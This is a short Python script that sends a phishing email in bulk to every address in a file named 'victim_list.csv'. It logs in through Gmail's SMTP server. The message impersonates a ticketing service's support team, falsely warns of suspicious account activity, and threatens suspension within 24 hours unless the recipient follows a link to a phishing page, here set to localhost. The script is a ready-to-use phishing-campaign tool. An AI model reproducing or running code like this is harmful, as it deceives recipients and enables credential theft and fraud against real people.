import csv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

victims_file = 'victim_list.csv'
phishing_link = 'http://127.0.0.1:8001/'

sender_email = input("Enter sender email: ")
app_password = input("Enter sender gmail app password: ")

msg = MIMEMultipart()
msg["From"] = "Ticketing Service Support <support@ticketservice.com>"
msg["Subject"] = "Action Required: Verify Your Account Now"
text = MIMEText(f"""\
Dear valued customer,

We have detected suspicious activity on your account. For your security, you must verify your account immediately.

Please click on the link below to verify your account:
{phishing_link}

Failure to verify your account within 24 hours will result in account suspension.

Best regards,
Ticketing Service Support Team
""")
msg.attach(text)

try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, app_password)

    with open(victims_file, mode='r', newline='', encoding='utf-8') as file:
        reader = csv.reader(file)
        for row in reader:
            victim_email = row[0]
            msg["To"] = victim_email
            server.sendmail(sender_email, victim_email, msg.as_string())

    server.quit()
    print("Phishing emails have been sent successfully.")
except Exception as e:
    print(f"An error occurred: {e}")
